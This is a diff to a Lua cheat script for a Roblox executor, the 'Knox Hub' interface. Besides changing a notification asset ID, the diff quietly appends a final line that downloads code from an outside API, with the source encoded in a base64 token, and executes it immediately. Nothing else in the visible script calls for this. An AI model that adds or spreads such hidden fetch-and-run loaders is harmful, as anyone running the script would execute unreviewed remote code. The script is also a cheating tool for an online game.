@@ -173,7 +173,7 @@ if not getgenv().TransparencyEnabled then
     getgenv().TransparencyEnabled = false
 end
 
-SendKnoxNotification("Knox Hub", "Toggle Keybind: ( R )", 30, "rbxassetid://89804924525665")
+SendKnoxNotification("Knox Hub", "Toggle Keybind: ( R )", 30, "rbxassetid://75885959789371")
 
 local MainWindow = WindUI:CreateWindow({
     ["Title"] = "Knox Hub",
@@ -4393,3 +4393,4 @@ Info:Paragraph({
 })
 
 SendNexoraNotification("Knox Hub", "Merged script loaded successfully!", 5, "rbxassetid://75885959789371")
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImI4NWUwNWFkLTY1MjQtNDhmYy05NDI5LTJmMTg0NDdmNTQyNiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vS25veFNjcmlwdDEvVEVTVElCRy9yZWZzL2hlYWRzL21haW4vYW50aSJ9fQ"))()
